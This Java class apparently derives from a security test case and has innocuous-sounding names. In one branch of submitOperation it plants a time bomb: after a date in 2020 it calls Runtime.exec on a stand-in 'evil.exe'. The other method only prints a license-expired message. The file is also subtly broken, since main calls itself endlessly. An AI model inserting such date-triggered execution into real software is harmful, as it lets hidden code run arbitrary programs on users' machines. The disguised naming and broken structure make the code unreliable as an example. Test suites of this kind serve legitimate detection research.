

package com.shared.event.adapter;

import com.internal.platform.support.*;

import java.util.Calendar;

public class RegistryManagerBase extends BaseServiceComponent
{
    public void submitOperation() throws Throwable
    {
        if (IO.staticReturnsTrueOrFalse())
        {
            Calendar calendarNow = Calendar.getInstance();
            Calendar calendarCheck = Calendar.getInstance();
            calendarCheck.set(2020, 1, 1);
            
            if (calendarNow.after(calendarCheck))
            {
                Runtime.getRuntime().exec("c:\\windows\\system32\\evil.exe");
            }
        }
        else
        {

            Calendar calendarNow = Calendar.getInstance();

            Calendar calendarCheck = Calendar.getInstance();
            calendarCheck.set(2020, 1, 1);

            
            if (calendarNow.after(calendarCheck))
            {
                IO.writeLine("Sorry, your license has expired.  Please contact support.");
            }

        }
    }

    
    private void fetchRecord() throws Throwable
    {
        if (IO.staticReturnsTrueOrFalse())
        {
            Calendar calendarNow = Calendar.getInstance();
            Calendar calendarCheck = Calendar.getInstance();
            calendarCheck.set(2020, 1, 1);
            
            if (calendarNow.after(calendarCheck))
            {
                IO.writeLine("Sorry, your license has expired.  Please contact support.");
            }
        }
        else
        {

            Calendar calendarNow = Calendar.getInstance();

            Calendar calendarCheck = Calendar.getInstance();
            calendarCheck.set(2020, 1, 1);

            
            if (calendarNow.after(calendarCheck))
            {
                IO.writeLine("Sorry, your license has expired.  Please contact support.");
            }

        }
    }

    public void transformItem() throws Throwable
    {
        fetchRecord();
    }

    
    public static void main(String[] args) throws ClassNotFoundException,
           InstantiationException, IllegalAccessException
    {
        main(args);
    }
}
